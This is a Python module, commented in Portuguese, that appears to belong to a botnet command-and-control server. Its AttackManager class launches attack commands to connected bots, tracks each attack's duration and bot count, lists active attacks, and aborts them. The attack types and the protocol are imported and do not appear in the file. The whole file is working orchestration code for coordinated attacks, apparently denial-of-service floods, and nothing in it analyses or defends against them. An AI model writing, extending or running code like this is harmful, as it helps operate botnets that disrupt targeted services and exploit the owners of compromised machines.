#!/usr/bin/env python3
"""
Gerenciamento de ataques — fila, agendamento, estado.
"""

import asyncio
import time
import logging
from enum import IntEnum
from typing import Optional
from dataclasses import dataclass, field

# Importa do protocolo com path absoluto do projeto
from cnc.protocol import AttackCommand, AttackType

log = logging.getLogger('cnc.attack')


@dataclass
class AttackJob:
    """Representa um ataque em andamento."""
    cmd: AttackCommand
    started_at: float = field(default_factory=time.time)
    completed: bool = False
    bot_count: int = 0
    job_id: str = ""

    @property
    def remaining(self) -> float:
        if self.completed:
            return 0
        elapsed = time.time() - self.started_at
        return max(0, self.cmd.duration - elapsed)

    @property
    def is_expired(self) -> bool:
        return time.time() - self.started_at >= self.cmd.duration


class AttackManager:
    """Gerencia o ciclo de vida dos ataques."""

    def __init__(self, cnc):
        self.cnc = cnc
        self.active_attacks: dict = {}
        self._lock = asyncio.Lock()

    async def launch(self, cmd: AttackCommand, target_all: bool = False) -> Optional[str]:
        """Lança um ataque e monitora sua execução."""

        job_id = f"ATK-{int(time.time())}-{cmd.attack_type.name}"

        sent = await self.cnc.attack(cmd, target_all)

        job = AttackJob(cmd=cmd, bot_count=sent, job_id=job_id)

        async with self._lock:
            self.active_attacks[job_id] = job

        # Task para monitorar e limpar quando expirar
        asyncio.create_task(self._monitor_job(job_id, job))

        log.info(f"[+] Ataque lançado: {job_id} | Tipo: {cmd.attack_type.name} | Duração: {cmd.duration}s | Bots: {sent}")
        return job_id

    async def _monitor_job(self, job_id: str, job: AttackJob):
        """Monitora job e limpa quando expirar."""
        await asyncio.sleep(job.cmd.duration + 2)
        job.completed = True
        async with self._lock:
            self.active_attacks.pop(job_id, None)
        log.info(f"[*] Ataque finalizado: {job_id}")

    async def list_active(self) -> list:
        """Lista ataques ativos."""
        async with self._lock:
            now = time.time()
            return [
                {
                    'id': jid,
                    'type': job.cmd.attack_type.name,
                    'elapsed': f"{now - job.started_at:.1f}s",
                    'remaining': f"{job.remaining:.1f}s",
                    'bots': job.bot_count,
                }
                for jid, job in self.active_attacks.items()
                if not job.completed
            ]

    async def stop_all(self):
        """Para todos os ataques ativos."""
        async with self._lock:
            for job_id, job in self.active_attacks.items():
                job.completed = True
                log.info(f"[!] Ataque abortado: {job_id}")
            self.active_attacks.clear()
